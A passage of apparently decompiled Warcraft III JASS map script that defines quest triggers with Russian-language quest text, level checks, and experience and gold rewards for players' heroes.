function BK5 takes nothing returns nothing
if BK4() then
call AddHeroXP(GetEnumUnit(),3000,false)
else
endif
endfunction
function BK6 takes nothing returns boolean
if not (GetUnitLevel(MT[GetForLoopIndexB()-1])>=29) then
return false
endif
return true
endfunction
function BK7 takes nothing returns nothing
call DisableTrigger(GetTriggeringTrigger())
set YV[41]=GetUnitLoc(GetTriggerUnit())
call CreateItemLoc($4930344E,YV[41])
call QuestSetCompletedBJ(YX[18],true)
call DestroyQuest(YX[18])
set Th=GetUnitsInRectMatching(GetPlayableMapRect(),Condition(function BK3))
call ForGroupBJ(Th,function BK5)
call DestroyGroup(Th)
set Sf=Sf+1
call RemoveLocation(YV[38])
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_COMPLETED,"|c00FF7F00Задание выполнено!|r Награда: |c00FF00FF3000 опыта|r, |c00ffff00300 золота|r, |c00ff969615 Кровавых Меток")
set bj_forLoopBIndex=1
set bj_forLoopBIndexEnd=8
loop
exitwhen bj_forLoopBIndex>bj_forLoopBIndexEnd
if BK6() then
set NJ[GetForLoopIndexB()]=NJ[GetForLoopIndexB()]+900
set NK[GetForLoopIndexB()]=NK[GetForLoopIndexB()]+45
else
endif
set bj_forLoopBIndex=bj_forLoopBIndex+1
endloop
endfunction
function BK8 takes nothing returns nothing
set Z9=CreateTrigger()
call DisableTrigger(Z9)
call TriggerRegisterUnitEvent(Z9,Iw,EVENT_UNIT_DEATH)
call TriggerAddAction(Z9,function BK7)
endfunction
function BK9 takes nothing returns boolean
if not (UnitHasItem(GetEnteringUnit(),GetItemOfTypeFromUnitBJ(GetEnteringUnit(),$4930344E))==true) then
return false
endif
return true
endfunction
function BLB takes nothing returns nothing
call DisableTrigger(GetTriggeringTrigger())
call SetUnitInvulnerable(K4,false)
call RemoveItem(GetItemOfTypeFromUnitBJ(GetEnteringUnit(),$4930344E))
call ModifyGateBJ(bj_GATEOPERATION_OPEN,Ho)
endfunction
function BLC takes nothing returns nothing
set aB=CreateTrigger()
call TriggerRegisterEnterRectSimple(aB,Bk)
call TriggerAddCondition(aB,Condition(function BK9))
call TriggerAddAction(aB,function BLB)
endfunction
function BLD takes nothing returns boolean
if not (GetUnitTypeId(GetOrderTargetUnit())==$6E636731) then
return false
endif
if not (DistanceBetweenPoints(GetUnitLoc(GetTriggerUnit()),GetUnitLoc(GetOrderTargetUnit()))<=300.) then
return false
endif
return true
endfunction
function BLE takes nothing returns boolean
if not (GetUnitLevel(GetTriggerUnit())>=30) then
return false
endif
return true
endfunction
function BLF takes nothing returns nothing
if BLE() then
call DisableTrigger(GetTriggeringTrigger())
call EnableTrigger(aD)
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_DISCOVERED,"|cffffcc00Задание получено:|r \"Морской бой\".")
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_REQUIREMENT,"|c006969FFУровень задания: 30-37|r
")
call CreateQuestBJ(bj_QUESTTYPE_OPT_DISCOVERED,"Морской бой","На Архипелаге обитает злобный монстр. Я хочу убедится, что он умер!
|c006969FFУровень задания: 30-37|r","ReplaceableTextures\\CommandButtons\\BTNAmbush.blp")
set YX[19]=GetLastCreatedQuestBJ()
call DestroyEffectBJ(Us[19])
call AddSpecialEffectTargetUnitBJ("overhead",Ke,"war3mapImported\\QuestYellow1_Portrait.mdx")
set Us[19]=GetLastCreatedEffectBJ()
else
call ne(GetTriggerUnit(),"Задание с |c00ff000030|r уровня",.027,255,255,255)
endif
endfunction
function BLG takes nothing returns nothing
set aC=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(aC,EVENT_PLAYER_UNIT_ISSUED_TARGET_ORDER)
call TriggerAddCondition(aC,Condition(function BLD))
call TriggerAddAction(aC,function BLF)
endfunction
function BLH takes nothing returns nothing
call DisableTrigger(GetTriggeringTrigger())
call EnableTrigger(aE)
call DestroyEffectBJ(Us[19])
call AddSpecialEffectTargetUnitBJ("overhead",Ke,"war3mapImported\\QuestYellow1.mdx")
set Us[19]=GetLastCreatedEffectBJ()
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_UPDATED,"|cffffcc00Тварь убита.|r")
endfunction
function BLI takes nothing returns nothing
set aD=CreateTrigger()
call DisableTrigger(aD)
call TriggerRegisterUnitEvent(aD,K4,EVENT_UNIT_DEATH)
call TriggerAddAction(aD,function BLH)
endfunction
function BLJ takes nothing returns boolean
if not (GetUnitTypeId(GetOrderTargetUnit())==$6E636731) then
return false
endif
if not (DistanceBetweenPoints(GetUnitLoc(GetTriggerUnit()),GetUnitLoc(GetOrderTargetUnit()))<=300.) then
return false
endif
return true
endfunction
function BLK takes nothing returns boolean
return IsUnitType(GetFilterUnit(),UNIT_TYPE_HERO)==true
endfunction
function BLL takes nothing returns boolean
return GetPlayerController(GetOwningPlayer(GetFilterUnit()))==MAP_CONTROL_USER
endfunction
function BLM takes nothing returns boolean
return GetUnitTypeId(GetFilterUnit())!=$48303457
endfunction
function BLN takes nothing returns boolean
return GetBooleanAnd(BLL(),BLM())
endfunction
function BLO takes nothing returns boolean
return GetBooleanAnd(BLK(),BLN())
endfunction
function BLP takes nothing returns boolean
if not (GetUnitLevel(GetEnumUnit())>=30) then
return false
endif
if not (GetUnitLevel(GetEnumUnit())<=37) then
return false
endif
return true
endfunction
function BLQ takes nothing returns nothing
if BLP() then
call AddHeroXP(GetEnumUnit(),3500,false)
else
endif
endfunction
function BLR takes nothing returns boolean
if not (GetUnitLevel(MT[GetForLoopIndexB()-1])>=30) then
return false
endif
return true
endfunction
function BLS takes nothing returns boolean
if not (GetUnitLevel(GetTriggerUnit())>=30) then
return false
endif
return true
endfunction
function BLT takes nothing returns nothing
if BLS() then
call DisableTrigger(GetTriggeringTrigger())
call CreateItemLoc($49305455,GetUnitLoc(GetTriggerUnit()))
call QuestSetCompletedBJ(YX[19],true)
call DestroyQuest(YX[19])
set Th=GetUnitsInRectMatching(GetPlayableMapRect(),Condition(function BLO))
call ForGroupBJ(Th,function BLQ)
call DestroyGroup(Th)
set Sf=Sf+1
call DestroyEffectBJ(Us[19])
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_COMPLETED,"|c00FF7F00Задание выполнено!|r Награда: |c00FF00FF5000 опыта|r, |c00ffff00400 золота|r, |c00ff969615 Кровавых Меток")
set bj_forLoopBIndex=1
set bj_forLoopBIndexEnd=8
loop
exitwhen bj_forLoopBIndex>bj_forLoopBIndexEnd
if BLR() then
set NJ[GetForLoopIndexB()]=NJ[GetForLoopIndexB()]+1200
set NK[GetForLoopIndexB()]=NK[GetForLoopIndexB()]+45
else
endif
set bj_forLoopBIndex=bj_forLoopBIndex+1
endloop
else
call ne(GetTriggerUnit(),"Задание с |c00ff000030|r уровня",.027,255,255,255)
endif
endfunction
function BLU takes nothing returns nothing
set aE=CreateTrigger()
call DisableTrigger(aE)
call TriggerRegisterAnyUnitEventBJ(aE,EVENT_PLAYER_UNIT_ISSUED_TARGET_ORDER)
call TriggerAddCondition(aE,Condition(function BLJ))
call TriggerAddAction(aE,function BLT)
endfunction
function BLV takes nothing returns boolean
if not (GetUnitTypeId(GetOrderTargetUnit())==$65647279) then
return false
endif
if not (DistanceBetweenPoints(GetUnitLoc(GetTriggerUnit()),GetUnitLoc(GetOrderTargetUnit()))<=300.) then
return false
endif
return true
endfunction
function BLW takes nothing returns boolean
if not (GetUnitLevel(GetTriggerUnit())>=3) then
return false
endif
return true
endfunction
function BLX takes nothing returns nothing
if BLW() then
call SetUnitOwner(GetOrderTargetUnit(),Player(8),true)
call SetUnitOwner(I0,Player(8),true)
call DisableTrigger(GetTriggeringTrigger())
call EnableTrigger(aD)
set YV[42]=GetRectCenter(Bx)
call CreateItemLoc($49303646,YV[42])
call SetUnitLifeBJ(I0,500.)
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_DISCOVERED,"|cffffcc00Задание получено:|r \"Однажды в Лесу\".")
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_REQUIREMENT,"|c006969FFУровень задания: 3-7|r
")
call CreateQuestBJ(bj_QUESTTYPE_OPT_DISCOVERED,"Однажды в Лесу","Мой друг гибнет.. спасите его! Он совсем слаб. Найдите способ его вылечить!
|c006969FFУровень задания: 3-7|r","ReplaceableTextures\\CommandButtons\\BTNAmbush.blp")
set YX[20]=GetLastCreatedQuestBJ()
call DestroyEffectBJ(Us[20])
call AddSpecialEffectTargetUnitBJ("overhead",Iz,"war3mapImported\\QuestYellow1_Portrait.mdx")
set Us[20]=GetLastCreatedEffectBJ()
call RemoveLocation(YV[42])
else
call ne(GetTriggerUnit(),"Задание с |c00ff00003|r уровня",.027,255,255,255)
endif
endfunction
function BLY takes nothing returns nothing
set aF=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(aF,EVENT_PLAYER_UNIT_ISSUED_TARGET_ORDER)
call TriggerAddCondition(aF,Condition(function BLV))
call TriggerAddAction(aF,function BLX)
endfunction
function BLZ takes nothing returns nothing
call DisableTrigger(GetTriggeringTrigger())
call EnableTrigger(aH)
call DestroyEffectBJ(Us[20])
call AddSpecialEffectTargetUnitBJ("overhead",Iz,"war3mapImported\\QuestYellow1.mdx")
set Us[20]=GetLastCreatedEffectBJ()
endfunction
function BLa takes nothing returns nothing
set aG=CreateTrigger()
call TriggerRegisterUnitLifeEvent(aG,I0,GREATER_THAN_OR_EQUAL,4999.)
call TriggerAddAction(aG,function BLZ)
endfunction
function BLb takes nothing returns boolean
if not (GetUnitTypeId(GetOrderTargetUnit())==$65647279) then
return false
endif
if not (DistanceBetweenPoints(GetUnitLoc(GetTriggerUnit()),GetUnitLoc(GetOrderTargetUnit()))<=300.) then
return false
endif
return true
endfunction
function BLc takes nothing returns boolean
return IsUnitType(GetFilterUnit(),UNIT_TYPE_HERO)==true
endfunction
function BLd takes nothing returns boolean
return GetPlayerController(GetOwningPlayer(GetFilterUnit()))==MAP_CONTROL_USER
endfunction
function BLe takes nothing returns boolean
return GetUnitTypeId(GetFilterUnit())!=$48303457
endfunction
function BLf takes nothing returns boolean
return GetBooleanAnd(BLd(),BLe())
endfunction
function BLg takes nothing returns boolean
return GetBooleanAnd(BLc(),BLf())
endfunction
function BLh takes nothing returns boolean
if not (GetUnitLevel(GetEnumUnit())>=3) then
return false
endif
if not (GetUnitLevel(GetEnumUnit())<=7) then
return false
endif
return true
endfunction
function BLi takes nothing returns nothing
if BLh() then
call AddHeroXP(GetEnumUnit(),600,false)
else
endif
endfunction
function BLj takes nothing returns boolean
if not (GetUnitLevel(MT[GetForLoopIndexB()-1])>=3) then
return false
endif
return true
endfunction
function BLk takes nothing returns boolean
if not (GetUnitLevel(GetTriggerUnit())>=3) then
return false
endif
return true
endfunction
function BLl takes nothing returns nothing
if BLk() then
call DisableTrigger(GetTriggeringTrigger())
call QuestSetCompletedBJ(YX[20],true)
call DestroyQuest(YX[20])
set Th=GetUnitsInRectMatching(GetPlayableMapRect(),Condition(function BLg))
call ForGroupBJ(Th,function BLi)
call DestroyGroup(Th)
set Sf=Sf+1
call DestroyEffectBJ(Us[20])
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_COMPLETED,"|c00FF7F00Задание выполнено!|r Награда: |c00FF00FF600 опыта|r, |c00ffff00200 золота|r, |c00ff96963 Кровавых Меток")
set bj_forLoopBIndex=1
set bj_forLoopBIndexEnd=8
loop
exitwhen bj_forLoopBIndex>bj_forLoopBIndexEnd
if BLj() then
set NJ[GetForLoopIndexB()]=NJ[GetForLoopIndexB()]+600
set NK[GetForLoopIndexB()]=NK[GetForLoopIndexB()]+9
else
endif
set bj_forLoopBIndex=bj_forLoopBIndex+1
endloop
else
call ne(GetTriggerUnit(),"Задание с |c00ff00003|r уровня",.027,255,255,255)
endif
endfunction
function BLm takes nothing returns nothing
set aH=CreateTrigger()
call DisableTrigger(aH)
call TriggerRegisterAnyUnitEventBJ(aH,EVENT_PLAYER_UNIT_ISSUED_TARGET_ORDER)
call TriggerAddCondition(aH,Condition(function BLb))
call TriggerAddAction(aH,function BLl)
endfunction
function BLn takes nothing returns boolean
if not (GetUnitTypeId(GetOrderTargetUnit())==$65686970) then
return false
endif
if not (DistanceBetweenPoints(GetUnitLoc(GetTriggerUnit()),GetUnitLoc(GetOrderTargetUnit()))<=300.) then
return false
endif
return true
endfunction
function BLo takes nothing returns boolean
if not (GetUnitLevel(GetTriggerUnit())>=14) then
return false
endif
return true
endfunction
function BLp takes nothing returns nothing
if BLo() then
call DestroyEffectBJ(Us[21])
call AddSpecialEffectTargetUnitBJ("overhead",IW,"war3mapImported\\QuestYellow1_Portrait.mdx")
set Us[21]=GetLastCreatedEffectBJ()
call DisableTrigger(GetTriggeringTrigger())
call SetUnitOwner(GetOrderTargetUnit(),Player(8),true)
call EnableTrigger(aJ)
call ShowUnitShow(LZ)
call PauseUnitBJ(false,LZ)
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_DISCOVERED,"|cffffcc00Задание получено:|r \"В погоне за неизвестным\".")
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_REQUIREMENT,"|c006969FFУровень задания: 14-20|r
")
call CreateQuestBJ(bj_QUESTTYPE_OPT_DISCOVERED,"В погоне за неизвестным","Всем хочется узнать секрет древнего оружия.... Но не все достойны! Докажите свою верность, и я открою Вам тайну, дам разрешение на получение желаемого!
|c006969FFУровень задания: 14-20|r","ReplaceableTextures\\CommandButtons\\BTNAmbush.blp")
set YX[21]=GetLastCreatedQuestBJ()
else
call ne(GetTriggerUnit(),"Задание с |c00ff000014|r уровня",.027,255,255,255)
endif
endfunction
function BLq takes nothing returns nothing
set aI=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(aI,EVENT_PLAYER_UNIT_ISSUED_TARGET_ORDER)
call TriggerAddCondition(aI,Condition(function BLn))
call TriggerAddAction(aI,function BLp)
endfunction
function BLr takes nothing returns nothing
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_REQUIREMENT,"УБИЛИ! УБИЛИ!")
call DestroyEffectBJ(Us[21])
call AddSpecialEffectTargetUnitBJ("overhead",IW,"war3mapImported\\QuestYellow1.mdx")
set Us[21]=GetLastCreatedEffectBJ()
call EnableTrigger(aK)
call EnableTrigger(aL)
endfunction
function BLs takes nothing returns nothing
set aJ=CreateTrigger()
call DisableTrigger(aJ)
call TriggerRegisterUnitEvent(aJ,LZ,EVENT_UNIT_DEATH)
call TriggerAddAction(aJ,function BLr)
endfunction
function BLt takes nothing returns boolean
if not (GetUnitTypeId(GetOrderTargetUnit())==$65686970) then
return false
endif
if not (DistanceBetweenPoints(GetUnitLoc(GetTriggerUnit()),GetUnitLoc(GetOrderTargetUnit()))<=300.) then
return false
endif
return true
endfunction
function BLu takes nothing returns boolean
return IsUnitType(GetFilterUnit(),UNIT_TYPE_HERO)==true
endfunction
function BLv takes nothing returns boolean
return GetPlayerController(GetOwningPlayer(GetFilterUnit()))==MAP_CONTROL_USER
endfunction
function BLw takes nothing returns boolean
return GetUnitTypeId(GetFilterUnit())!=$48303457
endfunction
function BLx takes nothing returns boolean
return GetBooleanAnd(BLv(),BLw())
endfunction
function BLy takes nothing returns boolean
return GetBooleanAnd(BLu(),BLx())
endfunction
function BLz takes nothing returns boolean
if not (GetUnitLevel(GetEnumUnit())>=14) then
return false
endif
if not (GetUnitLevel(GetEnumUnit())<=20) then
return false
endif
return true
endfunction
function BL0 takes nothing returns nothing
if BLz() then
call AddHeroXP(GetEnumUnit(),2000,false)
set TI[GetConvertedPlayerId(GetOwningPlayer(GetEnumUnit()))]=TI[GetConvertedPlayerId(GetOwningPlayer(GetEnumUnit()))]+1000
else
endif
endfunction
function BL1 takes nothing returns boolean
if not (GetUnitLevel(MT[GetForLoopIndexB()-1])>=14) then
return false
endif
return true
endfunction
function BL2 takes nothing returns boolean
if not (GetUnitLevel(GetTriggerUnit())>=14) then
return false
endif
return true
endfunction
function BL3 takes nothing returns nothing
if BL2() then
call DisableTrigger(GetTriggeringTrigger())
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_REQUIREMENT,"Хм... Смелые, отважные.. Ладно. Открою Вам немного частичку тайны. Для получения желаемого добудьте Книгу Мудрости!")
call QuestSetCompletedBJ(YX[21],true)
call DestroyQuest(YX[21])
set Th=GetUnitsInRectMatching(GetPlayableMapRect(),Condition(function BLy))
call ForGroupBJ(Th,function BL0)
call DestroyGroup(Th)
set Sf=Sf+1
call DestroyEffectBJ(Us[21])
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_COMPLETED,"|c00FF7F00Задание выполнено!|r Награда: |c00FF00FF1000 опыта|r, |c00ffff00200 золота|r, |c00ff96965 Кровавых Меток")
set bj_forLoopBIndex=1
set bj_forLoopBIndexEnd=8
loop
exitwhen bj_forLoopBIndex>bj_forLoopBIndexEnd
if BL1() then
set NJ[GetForLoopIndexB()]=NJ[GetForLoopIndexB()]+600
set NK[GetForLoopIndexB()]=NK[GetForLoopIndexB()]+15
else
endif
set bj_forLoopBIndex=bj_forLoopBIndex+1
endloop
else
call ne(GetTriggerUnit(),"Задание с |c00ff000014|r уровня",.027,255,255,255)
endif
endfunction
function BL4 takes nothing returns nothing
set aK=CreateTrigger()
call DisableTrigger(aK)
call TriggerRegisterAnyUnitEventBJ(aK,EVENT_PLAYER_UNIT_ISSUED_TARGET_ORDER)
call TriggerAddCondition(aK,Condition(function BLt))
call TriggerAddAction(aK,function BL3)
endfunction
function BL5 takes nothing returns boolean
if not (UnitHasItem(GetEnteringUnit(),GetItemOfTypeFromUnitBJ(GetEnteringUnit(),$49303654))==true) then
return false
endif
return true
endfunction
function BL6 takes nothing returns nothing
call DisableTrigger(GetTriggeringTrigger())
call RemoveItem(GetItemOfTypeFromUnitBJ(GetEnteringUnit(),$49303654))
call DisplayTextToForce(GetPlayersAll(),"Теперь вы можете покупать личные предметы.")
call ShowUnit(ID,true)
endfunction
function BL7 takes nothing returns nothing
set aL=CreateTrigger()
call DisableTrigger(aL)
call TriggerRegisterEnterRectSimple(aL,By)
call TriggerAddCondition(aL,Condition(function BL5))
call TriggerAddAction(aL,function BL6)
endfunction
function BL8 takes nothing returns boolean
if not (GetUnitTypeId(GetOrderTargetUnit())==$6E6B6F6C) then
return false
endif
if not (DistanceBetweenPoints(GetUnitLoc(GetTriggerUnit()),GetUnitLoc(GetOrderTargetUnit()))<=300.) then
return false
endif
return true
endfunction
function BL9 takes nothing returns boolean
if not (GetUnitLevel(GetTriggerUnit())>=33) then
return false
endif
return true
endfunction
function BMB takes nothing returns nothing
if BL9() then
call DestroyEffectBJ(Us[22])
call AddSpecialEffectTargetUnitBJ("overhead",Kd,"war3mapImported\\QuestYellow1_Portrait.mdx")
set Us[22]=GetLastCreatedEffectBJ()
call DisableTrigger(GetTriggeringTrigger())
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_DISCOVERED,"|cffffcc00Задание получено:|r \"Дорога дальше\".")
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_REQUIREMENT,"|c006969FFУровень задания: 33-40|r
")
call CreateQuestBJ(bj_QUESTTYPE_OPT_DISCOVERED,"Дорога дальше","Ухаха, слабаки! Убили Кая? Нет? ЖАЛКИЕ УБЛЮДКИ!!!
|c006969FFУровень задания: 33-40|r","ReplaceableTextures\\CommandButtons\\BTNAmbush.blp")
set YX[22]=GetLastCreatedQuestBJ()
else
call ne(GetTriggerUnit(),"Задание с |c00ff000033|r уровня",.027,255,255,255)
endif
endfunction
function BMC takes nothing returns nothing
set aM=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(aM,EVENT_PLAYER_UNIT_ISSUED_TARGET_ORDER)
call TriggerAddCondition(aM,Condition(function BL8))
call TriggerAddAction(aM,function BMB)
endfunction
function BMD takes nothing returns nothing
call EnableTrigger(aO)
call DestroyEffectBJ(Us[22])
call AddSpecialEffectTargetUnitBJ("overhead",Kd,"war3mapImported\\QuestYellow1.mdx")
set Us[22]=GetLastCreatedEffectBJ()
endfunction
function BME takes nothing returns nothing
set aN=CreateTrigger()
call TriggerRegisterUnitEvent(aN,LH,EVENT_UNIT_DEATH)
call TriggerAddAction(aN,function BMD)
endfunction
function BMF takes nothing returns boolean
if not (GetUnitTypeId(GetOrderTargetUnit())==$6E6B6F6C) then
return false
endif
if not (DistanceBetweenPoints(GetUnitLoc(GetTriggerUnit()),GetUnitLoc(GetOrderTargetUnit()))<=300.) then
return false
endif
return true
endfunction
function BMG takes nothing returns boolean
return IsUnitType(GetFilterUnit(),UNIT_TYPE_HERO)==true
endfunction
function BMH takes nothing returns boolean
return GetPlayerController(GetOwningPlayer(GetFilterUnit()))==MAP_CONTROL_USER
endfunction
function BMI takes nothing returns boolean
return GetUnitTypeId(GetFilterUnit())!=$48303457
endfunction
function BMJ takes nothing returns boolean
return GetBooleanAnd(BMH(),BMI())
endfunction
function BMK takes nothing returns boolean
return GetBooleanAnd(BMG(),BMJ())
endfunction
function BML takes nothing returns boolean
if not (GetUnitLevel(GetEnumUnit())>=33) then
return false
endif
if not (GetUnitLevel(GetEnumUnit())<=40) then
return false
endif
return true
endfunction
function BMM takes nothing returns nothing
if BML() then
call AddHeroXP(GetEnumUnit(),5500,false)
else
endif
endfunction
function BMN takes nothing returns boolean
if not (GetUnitLevel(MT[GetForLoopIndexB()-1])>=34) then
return false
endif
return true
endfunction
function BMO takes nothing returns boolean
if not (GetUnitLevel(GetTriggerUnit())>=33) then
return false
endif
return true
endfunction
function BMP takes nothing returns nothing
if BMO() then
call DestroyEffectBJ(Us[22])
call DisableTrigger(GetTriggeringTrigger())
call CreateItemLoc($49305732,GetUnitLoc(GetTriggerUnit()))
call QuestSetCompletedBJ(YX[22],true)
call DestroyQuest(YX[22])
set Th=GetUnitsInRectMatching(GetPlayableMapRect(),Condition(function BMK))
call ForGroupBJ(Th,function BMM)
call DestroyGroup(Th)
set Sf=Sf+1
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_COMPLETED,"|c00FF7F00Задание выполнено!|r Награда: |c00FF00FF5500 опыта|r, |c00ffff00600 золота|r, |c00ff969615 Кровавых Меток")
set bj_forLoopBIndex=1
set bj_forLoopBIndexEnd=8
loop
exitwhen bj_forLoopBIndex>bj_forLoopBIndexEnd
if BMN() then
set NJ[GetForLoopIndexB()]=NJ[GetForLoopIndexB()]+1800
set NK[GetForLoopIndexB()]=NK[GetForLoopIndexB()]+45
else
endif
set bj_forLoopBIndex=bj_forLoopBIndex+1
endloop
else
call ne(GetTriggerUnit(),"Задание с |c00ff000033|r уровня",.027,255,255,255)
endif
endfunction
function BMQ takes nothing returns nothing
set aO=CreateTrigger()
call DisableTrigger(aO)
call TriggerRegisterAnyUnitEventBJ(aO,EVENT_PLAYER_UNIT_ISSUED_TARGET_ORDER)
call TriggerAddCondition(aO,Condition(function BMF))
call TriggerAddAction(aO,function BMP)
endfunction
function BMR takes nothing returns boolean
if not (GetUnitTypeId(GetOrderTargetUnit())==$65646F63) then
return false
endif
if not (DistanceBetweenPoints(GetUnitLoc(GetTriggerUnit()),GetUnitLoc(GetOrderTargetUnit()))<=300.) then
return false
endif
return true
endfunction
function BMS takes nothing returns nothing
call DestroyEffectBJ(Us[23])
call AddSpecialEffectTargetUnitBJ("overhead",IX,"war3mapImported\\QuestYellow1_Portrait.mdx")
set Us[23]=GetLastCreatedEffectBJ()
call SetUnitOwner(GetOrderTargetUnit(),Player(8),true)
call DisableTrigger(GetTriggeringTrigger())
set YV[44]=GetRectCenter(B1)
call CreateItemLoc($49303734,YV[44])
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_DISCOVERED,"|cffffcc00Задание получено:|r \"Голодный\".")
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_REQUIREMENT,"|c006969FFУровень задания: 13-17|r
")
call CreateQuestBJ(bj_QUESTTYPE_OPT_DISCOVERED,"Голодный","Как же я хочу есть.... Голодать - точно не моя стихия. У Вас есть что-то сьедобное?
|c006969FFУровень задания: 13-17|r","ReplaceableTextures\\CommandButtons\\BTNAmbush.blp")
set YX[23]=GetLastCreatedQuestBJ()
call RemoveLocation(YV[44])
endfunction
function BMT takes nothing returns nothing
set aP=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(aP,EVENT_PLAYER_UNIT_ISSUED_TARGET_ORDER)
call TriggerAddCondition(aP,Condition(function BMR))
call TriggerAddAction(aP,function BMS)
endfunction
function BMU takes nothing returns boolean
if not (UnitHasItem(GetEnteringUnit(),GetItemOfTypeFromUnitBJ(GetEnteringUnit(),$49303734))==true) then
return false
endif
return true
endfunction
function BMV takes nothing returns nothing
call DisableTrigger(GetTriggeringTrigger())
call RemoveItem(GetItemOfTypeFromUnitBJ(GetEnteringUnit(),$49303734))
call AddSpecialEffectTargetUnitBJ("overhead",GetTriggerUnit(),"Abilities\\Spells\\Items\\AIem\\AIemTarget.mdl")
call DestroyEffectBJ(GetLastCreatedEffectBJ())
call UnitAddItemByIdSwapped($49303735,GetTriggerUnit())
endfunction
function BMW takes nothing returns nothing
set aQ=CreateTrigger()
call TriggerRegisterEnterRectSimple(aQ,Z)
call TriggerAddCondition(aQ,Condition(function BMU))
call TriggerAddAction(aQ,function BMV)
endfunction
function BMX takes nothing returns boolean
if not (UnitHasItem(GetEnteringUnit(),GetItemOfTypeFromUnitBJ(GetEnteringUnit(),$49303735))==true) then
return false
endif
return true
endfunction
function BMY takes nothing returns boolean
return IsUnitType(GetFilterUnit(),UNIT_TYPE_HERO)==true
endfunction
function BMZ takes nothing returns boolean
return GetPlayerController(GetOwningPlayer(GetFilterUnit()))==MAP_CONTROL_USER
endfunction
function BMa takes nothing returns boolean
return GetUnitTypeId(GetFilterUnit())!=$48303457
endfunction
function BMb takes nothing returns boolean
return GetBooleanAnd(BMZ(),BMa())
endfunction
function BMc takes nothing returns boolean
return GetBooleanAnd(BMY(),BMb())
endfunction
function BMd takes nothing returns boolean
if not (GetUnitLevel(GetEnumUnit())>=13) then
return false
endif
if not (GetUnitLevel(GetEnumUnit())<=17) then
return false
endif
return true
endfunction
function BMe takes nothing returns nothing
if BMd() then
call AddHeroXP(GetEnumUnit(),900,false)
set TI[GetConvertedPlayerId(GetOwningPlayer(GetEnumUnit()))]=TI[GetConvertedPlayerId(GetOwningPlayer(GetEnumUnit()))]+900
else
endif
endfunction
function BMf takes nothing returns boolean
if not (GetUnitLevel(MT[GetForLoopIndexB()-1])>=13) then
return false
endif
return true
endfunction
function BMg takes nothing returns nothing
call DestroyEffectBJ(Us[23])
call RemoveItem(GetItemOfTypeFromUnitBJ(GetEnteringUnit(),$49303735))
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_REQUIREMENT,"Как вкусно! Спасибо огромное!")
call QuestSetCompletedBJ(YX[23],true)
call DestroyQuest(YX[23])
set Th=GetUnitsInRectMatching(GetPlayableMapRect(),Condition(function BMc))
call ForGroupBJ(Th,function BMe)
call DestroyGroup(Th)
set Sf=Sf+1
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_COMPLETED,"|c00FF7F00Задание выполнено!|r Награда: |c00FF00FF900 опыта|r, |c00ffff00150 золота|r, |c00ff96963 Кровавых Меток
|c00ffff00Друид-медведь|r: прийдите попозже, у меня есть для вас работенка.")
set bj_forLoopBIndex=1
set bj_forLoopBIndexEnd=8
loop
exitwhen bj_forLoopBIndex>bj_forLoopBIndexEnd
if BMf() then
set NJ[GetForLoopIndexB()]=NJ[GetForLoopIndexB()]+450
set NK[GetForLoopIndexB()]=NK[GetForLoopIndexB()]+9
else
endif
set bj_forLoopBIndex=bj_forLoopBIndex+1
endloop
call TriggerSleepAction(60.)
call EnableTrigger(aS)
call AddSpecialEffectTargetUnitBJ("overhead",IX,"war3mapImported\\TalkToMev2.mdx")
set Us[23]=GetLastCreatedEffectBJ()
endfunction
function BMh takes nothing returns nothing
set aR=CreateTrigger()
call TriggerRegisterEnterRectSimple(aR,B0)
call TriggerAddCondition(aR,Condition(function BMX))
call TriggerAddAction(aR,function BMg)
endfunction
function BMi takes nothing returns boolean
if not (GetUnitTypeId(GetOrderTargetUnit())==$65646F63) then
return false
endif
if not (DistanceBetweenPoints(GetUnitLoc(GetTriggerUnit()),GetUnitLoc(GetOrderTargetUnit()))<=300.) then
return false
endif
return true
endfunction
function BMj takes nothing returns boolean
if not (GetUnitLevel(GetTriggerUnit())>=15) then
return false
endif
return true
endfunction
function BMk takes nothing returns nothing
if BMj() then
call DestroyEffectBJ(Us[23])
call AddSpecialEffectTargetUnitBJ("overhead",IX,"war3mapImported\\QuestYellow1_Portrait.mdx")
set Us[23]=GetLastCreatedEffectBJ()
call DisableTrigger(GetTriggeringTrigger())
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_DISCOVERED,"|cffffcc00Задание получено:|r \"Порабощение\".")
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_REQUIREMENT,"|c006969FFУровень задания: 15-25|r
")
call CreateQuestBJ(bj_QUESTTYPE_OPT_DISCOVERED,"Порабощение","Тут неподалеку обосновался некий темный маг Оракул. Не могли бы Вы отправить его на тот свет? С меня достойная награда.
|c006969FFУровень задания: 15-25","ReplaceableTextures\\CommandButtons\\BTNAmbush.blp")
set YX[23]=GetLastCreatedQuestBJ()
else
call ne(GetTriggerUnit(),"Задание с |c00ff000015|r уровня",.027,255,255,255)
endif
endfunction
function BMl takes nothing returns nothing
set aS=CreateTrigger()
call DisableTrigger(aS)
call TriggerRegisterAnyUnitEventBJ(aS,EVENT_PLAYER_UNIT_ISSUED_TARGET_ORDER)
call TriggerAddCondition(aS,Condition(function BMi))
